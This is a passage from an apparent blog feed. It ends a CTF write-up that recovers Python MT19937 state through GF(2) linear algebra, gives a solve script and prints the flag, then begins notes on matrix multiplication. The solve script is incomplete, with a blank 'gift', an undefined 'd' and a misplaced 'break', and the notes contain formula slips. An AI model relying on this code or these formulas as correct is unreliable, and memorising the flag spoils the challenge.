src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251202200350918.png" alt="image-20251202200350918"></p><ul><li>从上面可以得到解集<code>s</code>的维数不为零，这就导致约束太少，求得的解集自由度比较高。现在就要想如何进行爆破操作，在学习线性代数的时候我们有学习到下面俩个知识点：<ul><li>齐次线性方程组解的结构：将主元使用非主元的未知数表示，构成一个通解也构成一个线性空间。</li><li>非齐次线性方程组解的结构：对应齐次线性方程组的通解加上非齐次线性方程组的一个特解，构成一个线性流型（线性流型并不是线性子空间）</li></ul></li><li>此时我们需要先构造出该方程（也就是非齐次线性方程组）的通解，根据通解取遍历所有解，从而爆破出正确的解。首先我们特解<code>s</code>已经被解出来了，现在就是要看看通解。</li><li>并且由于该方程是在有限域$GF(2)$上的解，所以解集是有限的，通过排列组合可以得到解向量中自由解每个都可以取<code>0或1</code>，这样就可以得到维数与解的总数二者之间的关系为：</li></ul><script type="math/tex; mode=display">count_{result}=2^{dim~(s)}</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">R = vector(GF(<span class="number">2</span>),R)</span><br><span class="line">s = L.solve_left(R)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">dim_s = L.left_kernel().dimension()<span class="comment">#basis()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解集s的维数:&quot;</span>,dim_s)</span><br><span class="line">null_basis = L.left_kernel().basis() <span class="comment"># 先求出左核空间的一组基</span></span><br><span class="line">s0 = s <span class="comment"># 获取特解</span></span><br><span class="line">basis = null_basis <span class="comment"># 获取齐次线性方程组解空间的基</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;左零空间维数 d = <span class="subst">&#123;dim_s&#125;</span>, 总特解数量 = <span class="subst">&#123;<span class="number">2</span>**dim_s&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/11/26/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-wp/image-20251202201832615.png" alt="image-20251202201832615"></p><ul><li>虽然说总特解数量还是比较多，但是其实可以爆破出来的，这里直接使用<code>itertools</code>库中的<code>product</code>将所有自由变量的取值都遍历一遍，下面做一个示例：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line">candidate = <span class="built_in">list</span>(product([<span class="number">0</span>,<span class="number">1</span>], repeat=<span class="number">4</span>)) <span class="comment"># 用来生成多个序列的笛卡尔积，并转换为列表形式</span></span><br><span class="line"><span class="built_in">print</span>(candidate)</span><br><span class="line">[(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>), (<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>), (<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>), (<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>), (<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>), (<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>), (<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)]</span><br></pre></td></tr></table></figure><ul><li>接下来就需要计算出该核空间的一组基，如下所示（只是一个例子）：</li></ul><script type="math/tex; mode=display">B = \begin{bmatrix}0&1&\dots&0&0\\0&0&\dots&0&0\\\vdots&\vdots&\ddots&\vdots&\vdots\\1&1&\dots&0&1\end{bmatrix}_{38×19968}</script><ul><li>最后遍历所有自由度加上通解即可开始爆破状态：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line">solutions = []</span><br><span class="line"><span class="keyword">for</span> coeffs <span class="keyword">in</span> product([<span class="number">0</span>,<span class="number">1</span>], repeat=d):</span><br><span class="line">    <span class="comment"># 构造一个完整解 s_candidate = s0 + sum(coeff_i * basis_i) = (0,1,.....,0)</span></span><br><span class="line">    s_candidate = s0</span><br><span class="line">    <span class="keyword">for</span> c, b <span class="keyword">in</span> <span class="built_in">zip</span>(coeffs, basis):</span><br><span class="line">        <span class="keyword">if</span> c == <span class="number">1</span>:</span><br><span class="line">            s_candidate += b</span><br><span class="line">    <span class="comment"># 将该解转换为GF(2)下的向量</span></span><br><span class="line">    s_candidate = vector(GF(<span class="number">2</span>), s_candidate)</span><br><span class="line">    <span class="comment"># s_candidate作为初始化状态即可,就可以构造init,从而开始爆破初始状态</span></span><br><span class="line">    init = <span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">str</span>, s_candidate)))</span><br><span class="line">    state = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">        state.append(<span class="built_in">int</span>(init[<span class="number">32</span>*i:<span class="number">32</span>*i+<span class="number">32</span>], <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    RNG1 = Random()</span><br><span class="line">    RNG1.setstate((<span class="number">3</span>, <span class="built_in">tuple</span>(state + [<span class="number">624</span>]), <span class="literal">None</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接下来就是恢复操作了</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3108</span>):</span><br><span class="line">        RNG1.getrandbits(<span class="number">8</span>)</span><br><span class="line">        RNG1.getrandbits(<span class="number">16</span>)</span><br><span class="line">    x = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ct))]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2025</span>):</span><br><span class="line">        RNG1.shuffle(x)</span><br><span class="line">    </span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ct)):</span><br><span class="line">        flag += ct[x.index(i)]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="ezran-exp"><a href="#ezran-EXP" class="headerlink" title="ezran-EXP"></a>ezran-EXP</h3><ul><li>完整exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">gift = </span><br><span class="line">ct = <span class="string">&#x27;)9Lsu_4s_eb__otEli_nhe_tes5gii5sT@omamkn__ari&#123;efm0__rmu_nt(0Eu3_En_og5rfoh&#125;nkeoToy_bthguuEh7___u&#x27;</span></span><br><span class="line">candidate = []</span><br><span class="line"></span><br><span class="line">gift = long_to_bytes(gift)</span><br><span class="line">RNG = Random()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">construct_a_row</span>(<span class="params">RNG</span>):</span><br><span class="line">    row = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(gift)//<span class="number">2</span>):</span><br><span class="line">        RNG.getrandbits(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            row += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, (<span class="built_in">bin</span>(RNG.getrandbits(<span class="number">16</span>) &gt;&gt; <span class="number">1</span>)[<span class="number">2</span>:].zfill(<span class="number">15</span>))))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            row += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, (<span class="built_in">bin</span>(RNG.getrandbits(<span class="number">16</span>) &gt;&gt; <span class="number">8</span>)[<span class="number">2</span>:].zfill(<span class="number">8</span>))))</span><br><span class="line">    <span class="keyword">return</span> row</span><br><span class="line"></span><br><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">19968</span>):</span><br><span class="line">    state = [<span class="number">0</span>]*<span class="number">624</span></span><br><span class="line">    temp = <span class="string">&quot;0&quot;</span>*i + <span class="string">&quot;1&quot;</span>*<span class="number">1</span> + <span class="string">&quot;0&quot;</span>*(<span class="number">19968</span>-<span class="number">1</span>-i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">        state[j] = <span class="built_in">int</span>(temp[<span class="number">32</span>*j:<span class="number">32</span>*j+<span class="number">32</span>],<span class="number">2</span>)</span><br><span class="line">    RNG.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(state+[<span class="number">624</span>]),<span class="literal">None</span>))</span><br><span class="line">    L.append(construct_a_row(RNG))</span><br><span class="line"></span><br><span class="line">L = Matrix(GF(<span class="number">2</span>),L)</span><br><span class="line">R = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="built_in">len</span>(gift)//<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>):</span><br><span class="line">        R += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, (<span class="built_in">bin</span>(candidate[i] &gt;&gt; <span class="number">1</span>)[<span class="number">2</span>:].zfill(<span class="number">15</span>))))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        R += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, (<span class="built_in">bin</span>(candidate[i] &gt;&gt; <span class="number">8</span>)[<span class="number">2</span>:].zfill(<span class="number">8</span>))))</span><br><span class="line"></span><br><span class="line">R = vector(GF(<span class="number">2</span>),R)</span><br><span class="line">s = L.solve_left(R)</span><br><span class="line"><span class="comment">#print(s)</span></span><br><span class="line">dim_s = L.left_kernel().dimension()<span class="comment">#basis()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解集s的维数:&quot;</span>,dim_s)</span><br><span class="line">null_basis = L.left_kernel().basis() <span class="comment"># 先求出左核空间的一组基</span></span><br><span class="line">s0 = s <span class="comment"># 获取特解</span></span><br><span class="line">basis = null_basis <span class="comment"># 获取齐次线性方程组解空间的基</span></span><br><span class="line"><span class="built_in">print</span>(basis)</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line">solutions = []</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s0))</span><br><span class="line"><span class="keyword">for</span> coeffs <span class="keyword">in</span> product([<span class="number">0</span>,<span class="number">1</span>], repeat=d):</span><br><span class="line">    <span class="comment"># 构造一个完整解 s_candidate = s0 + sum(coeff_i * basis_i) = (0,1,.....,0)</span></span><br><span class="line">    s_candidate = s0</span><br><span class="line">    <span class="keyword">for</span> c, b <span class="keyword">in</span> <span class="built_in">zip</span>(coeffs, basis):</span><br><span class="line">        <span class="keyword">if</span> c == <span class="number">1</span>:</span><br><span class="line">            s_candidate += b</span><br><span class="line">    <span class="comment"># 将该解转换为GF(2)下的向量</span></span><br><span class="line">    s_candidate = vector(GF(<span class="number">2</span>), s_candidate)</span><br><span class="line">    <span class="comment"># s_candidate作为初始化状态即可,就可以构造init,从而开始爆破初始状态</span></span><br><span class="line">    init = <span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">str</span>, s_candidate)))</span><br><span class="line">    state = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">        state.append(<span class="built_in">int</span>(init[<span class="number">32</span>*i:<span class="number">32</span>*i+<span class="number">32</span>], <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    RNG1 = Random()</span><br><span class="line">    RNG1.setstate((<span class="number">3</span>, <span class="built_in">tuple</span>(state + [<span class="number">624</span>]), <span class="literal">None</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接下来就是恢复操作了</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3108</span>):</span><br><span class="line">        RNG1.getrandbits(<span class="number">8</span>)</span><br><span class="line">        RNG1.getrandbits(<span class="number">16</span>)</span><br><span class="line">    x = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ct))]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2025</span>):</span><br><span class="line">        RNG1.shuffle(x)</span><br><span class="line">    </span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ct)):</span><br><span class="line">        flag += ct[x.index(i)]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="comment"># flag&#123;7hE_numbEr_0f_biT5_i5_Enou9h_@L5o_ThE_r4nk_must_3n0ugh&#125;(some_noise_to_make_sure_you_get_it)</span></span><br></pre></td></tr></table></figure><ul><li>最终flag为：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7hE_numbEr_0f_biT5_i5_Enou9h_@L5o_ThE_r4nk_must_3n0ugh&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：复现一些题目。</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="write-up" scheme="http://iyheart.github.io/categories/CTF/write-up/"/>
    
    
  </entry>
  
  <entry>
    <title>高等代数-矩阵的运算</title>
    <link href="http://iyheart.github.io/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/"/>
    <id>http://iyheart.github.io/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/</id>
    <published>2025-11-25T14:19:24.000Z</published>
    <updated>2025-12-19T17:47:15.828Z</updated>
    
    <content type="html"><![CDATA[<p>学到矩阵的运算课程进度已经过了三分之一了，但是到线性空间这块只听和做点小笔记，但是还没怎么刷题。由于矩阵运算线性代数有上过现在采取边复习线性空间的内容，边刷题，边看矩阵运算的内容，边写矩阵运算的相关练习题目。</p><p>等学习到多项式，估计LSFR的学习就可以提上日程了QAQ，原本大二下就想学习LFSR，可是看了BM算法自己根本理解不了，估计还是数学知识积累的不够，还是打基础吧。</p><p>目前已经学习了三种线性空间：</p><ul><li>几何空间是线性空间</li><li>有序数组（也就是向量）是线性空间</li><li>$M_{s×n}(K)$是线性空间</li></ul><h1 id="回顾矩阵的秩"><a href="#回顾——矩阵的秩" class="headerlink" title="回顾——矩阵的秩"></a>回顾——矩阵的秩</h1><h1 id="矩阵的基本运算"><a href="#矩阵的基本运算" class="headerlink" title="矩阵的基本运算"></a>矩阵的基本运算</h1><h2 id="矩阵加法与数量乘法"><a href="#矩阵加法与数量乘法" class="headerlink" title="矩阵加法与数量乘法"></a>矩阵加法与数量乘法</h2><blockquote><p><strong>定义1</strong>：矩阵记号、相等、零矩阵</p><p>（1）$M_{s×n}(K)={数域K上s×n矩阵}$，当$s=n$时，记为$M_n(K)$，也就是方阵。</p><p>（2）两个矩阵相等$\Longleftrightarrow$这两个矩阵行数相等，列数相等对应元素相等。</p><p>（3）元素全为0</p><p><strong>定义2</strong>：矩阵加法</p><script type="math/tex; mode=display">\begin{bmatrix}a_{11}&...&a_{1n}\\ \vdots & \ddots& \vdots \\a_{s1} & \dots & a_{sn}\end{bmatrix}+\begin{bmatrix}b_{11}&...&b_{1n}\\ \vdots & \ddots& \vdots \\b_{s1} & \dots & b_{sn}\end{bmatrix}=\begin{bmatrix}a_{11}+b_{11}&...&a_{1n}+b_{1n}\\ \vdots & \ddots& \vdots \\a_{s1}+b_{s1} & \dots & a_{sn}+b_{sn}\end{bmatrix}</script><p><strong>定义3</strong>：矩阵的数量乘法</p><script type="math/tex; mode=display">k\begin{bmatrix}a_{11}&...&a_{1n}\\ \vdots & \ddots& \vdots \\a_{s1} & \dots & a_{sn}\end{bmatrix}=\begin{bmatrix}ka_{11}&...&ka_{1n}\\ \vdots & \ddots& \vdots \\ka_{s1} & \dots & ka_{sn}\end{bmatrix}</script></blockquote><h2 id="矩阵乘法"><a href="#矩阵乘法" class="headerlink" title="矩阵乘法"></a>矩阵乘法</h2><p>先来看看矩阵乘法的引入，矩阵乘法的引入还是比较重要的，当时在学线代的时候对于矩阵乘法完全就是死记，一点也不知道规律在哪里。</p><blockquote><p>首先矩阵的乘法是从<strong>映射的乘法</strong>引出的，考虑这么一个问题：平面上原点O，以及平面上一点P其坐标为$(x,y)$，OP构成一个长度为<code>r</code>的有向线段即$\vec{OP}$，并且$\vec{OP}$与x轴夹角为$\alpha$。有一个转角为$\theta$的旋转记作$\sigma$，其中$\sigma$是一个映射。求旋转之后$P’$的坐标，如下图所示：</p><p><img src="/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/image-20251201150405839.png" alt="image-20251201150405839"></p><ul><li>首先我们由于旋转前后<code>r</code>是不变的量，所以先将$\vec{OP}$的坐标使用参数方程的形式表示出来。</li></ul><script type="math/tex; mode=display">\begin{cases}x=r\cos\alpha\\y=r\sin\alpha\end{cases}</script><ul><li>之后我们可以通过不变的量<code>r</code>，将$\vec{OP}$的坐标也使用参数方程的形式表示出来，将$\vec{OP}$的参数方程带入就可以得到一个关于<code>x、y</code>与<code>x&#39;、y&#39;</code>的关系</li></ul><script type="math/tex; mode=display">\begin{cases}x'=r\cos(\alpha+\theta)=r\cos\alpha\cos\theta-r\sin\alpha\sin\theta\\y'=r\sin(\alpha+\theta)=r\sin\alpha\cos\theta+r\cos\alpha\sin\theta\end{cases}\\\Rightarrow \begin{cases}x'=x\cos\theta-y\sin\theta\\y'=x\cos\theta+y\sin\theta\end{cases}\\</script><ul><li>将<code>x、y</code>当做未知数，将$\sin、\cos$当做系数，就会得到一个系数矩阵，所以定义转角为$\theta$的旋转$\sigma$为：</li></ul><script type="math/tex; mode=display">\sigma\mapsto\begin{bmatrix}\cos\theta & -\sin\theta\\\sin\theta&\cos\theta\end{bmatrix}</script><ul><li>同理可以得到，一个转角为$\phi$的旋转$\tau$为：</li></ul><script type="math/tex; mode=display">\tau\mapsto\begin{bmatrix}\cos\phi&-\sin\phi\\\sin\phi&\cos\phi\end{bmatrix}</script><p>接下来我们考虑先旋转$\theta$角度，再旋转$\phi$角度；也就是先进行$\sigma$映射，再进行$\tau$映射，那么就可以得到转角为$(\theta+\phi)$，如下图所示。</p><ul><li>同上面的方式，我们就可以比较轻松的得到映射乘法的结果：</li></ul><script type="math/tex; mode=display">\tau\circ\sigma\mapsto\begin{bmatrix}\cos(\theta+\phi)&-\sin(\theta+\phi)\\\sin(\theta+\phi)&\cos(\theta+\phi)\end{bmatrix}</script><ul><li>记$\mathbf{A}=\begin{bmatrix}<br>\cos\phi&amp;-\sin\phi\\sin\phi&amp;\cos\phi\end{bmatrix}$，$\begin{bmatrix}\cos\theta &amp; -\sin\theta\\sin\theta&amp;\cos\theta\end{bmatrix}$，​根据映射的乘法就导出了矩阵的乘法</li></ul><script type="math/tex; mode=display">AB:=\tau\circ\sigma\mapsto\begin{bmatrix}\cos(\theta+\phi)&-\sin(\theta+\phi)\\\sin(\theta+\phi)&\cos(\theta+\phi)\end{bmatrix}</script><ul><li>将$\mathbf{A}、\mathbf{B}$带入并且将乘法的结果矩阵里面的三角函数使用和角公式展开就得到如下所示的乘法式子，可以发现规律：<ul><li>（先看左边矩阵的第一行和右边矩阵的第1、2列）左边矩阵的第一行第一个元素与右边矩阵第一列的一个元素相乘加上左边矩阵第一行第二个元素与右边矩阵第一列第二个元素相乘，组成了乘积矩阵第一行第一个元素的值。</li><li>（先看左边矩阵的第一行和右边矩阵的第1、2列）左边矩阵的第一行第一个元素与右边矩阵第二列的一个元素相乘加上左边矩阵第一行第二个元素与右边矩阵第二列第二个元素相乘，组成了乘积矩阵第一行第二个元素的值。</li><li>从而发现：左边矩阵的第$i$行的各个元素与右边矩阵第$j$列各个元素相乘之和即为结果矩阵$C(i,j)$元</li></ul></li></ul><script type="math/tex; mode=display">\begin{bmatrix}\cos\phi&-\sin\phi\\\cos\phi&\sin\phi\end{bmatrix}\begin{bmatrix}\cos\phi&-\sin\phi\\\cos\phi&\sin\phi\end{bmatrix}=\begin{bmatrix}\cos\theta\cos\phi-\sin\theta\sin\phi&-\sin\theta\cos\phi-\cos\theta\sin\phi\\\sin\theta\cos\phi+\cos\theta\sin\phi&\cos\theta\cos\phi-\sin\theta\sin\phi\end{bmatrix}</script></blockquote><p>从而导出了矩阵乘法的定义</p><blockquote><p><strong>定义4</strong>：矩阵乘法</p><p>记：$\mathbf{A<em>{s×n}}=\begin{bmatrix}<br>a</em>{11}&amp;\dots&amp;a<em>{1n}\<br>\vdots&amp;\ddots&amp;\vdots\<br>a</em>{s1}&amp;\dots&amp;a<em>{sn}<br>\end{bmatrix}$，$\mathbf{B</em>{n×m}}=\begin{bmatrix}b<em>{11}&amp;\dots&amp;b</em>{1m}\\vdots&amp;\ddots&amp;\vdots\b<em>{n1}&amp;\dots&amp;b</em>{n×m}\end{bmatrix}$，则有</p><script type="math/tex; mode=display">\mathbf{A_{s×n}}*\mathbf{B_{n×m}}=\begin{bmatrix}a_{11}&\dots&a_{1n}\\\vdots&\ddots&\vdots\\a_{s1}&\dots&a_{sn}\end{bmatrix}*\begin{bmatrix}b_{11}&\dots&b_{1m}\\\vdots&\ddots&\vdots\\b_{n1}&\dots&b_{nm}\end{bmatrix}:=\begin{bmatrix}a_{11}b_{11}+...+a_{1n}b_{n1}&\dots&a_{11}b_{1m}+...+a_{1n}b_{nm}\\\vdots&\ddots&\vdots\\a_{s1}b_{11}+...+a_{sn}b_{n1}&\dots&a_{s1}b_{1m}+...+a_{sn}b_{nm}\end{bmatrix}_{s×m}</script><p>要点：</p><ol><li>左矩阵的列数=右矩阵的行数</li><li>乘积矩阵$AB(i,j)=a<em>{i1}b</em>{1j}+…+a<em>{in}b</em>{mj}=\sum^{n}<em>{k=1}a</em>{ik}b_{kj}$</li><li>$\mathbf{AB}$的行数=$\mathbf{A}$的行数，$\mathbf{AB}$的列数=$\mathbf{B}$的列数</li></ol></blockquote><p>接下来再介绍一下矩阵乘法的一些要点，先给个例子看看</p><blockquote><p>eg1：</p><script type="math/tex; mode=display">\mathbf{A}=\begin{bmatrix}1&2\\0&0\end{bmatrix},\mathbf{B}=\begin{bmatrix}0&0\\0&1\end{bmatrix}</script><p>则有如下结果</p><script type="math/tex; mode=display">\mathbf{AB}=\begin{bmatrix}1&2\\0&0\end{bmatrix}\begin{bmatrix}0&0\\0&1\end{bmatrix}=\begin{bmatrix}0&2\\0&0\end{bmatrix}</script><script type="math/tex; mode=display">\mathbf{BA}= \begin{bmatrix}0&0\\0&1\end{bmatrix}\begin{bmatrix}1&2\\0&0\end{bmatrix}=\begin{bmatrix}0&0\\0&0\end{bmatrix}</script><p>从例题中我们可以看出，如下两个结论</p><p>结论1：矩阵相乘不满足交换律</p><p>结论2：两个非零矩阵相乘结果可能是零矩阵</p><p>eg2：通过引入矩阵的乘法，其实就可以将行向量与列向量相乘当做矩阵的乘法来运算。</p><p>有两个矩阵$\mathbf{A}=\begin{bmatrix}1,\dots,1\end{bmatrix}<em>{1×n}$，$\mathbf{B}=\begin{bmatrix}1\\vdots\1\end{bmatrix}</em>{n×1}$，那么这两个矩阵相乘就会出现如下结果：</p><script type="math/tex; 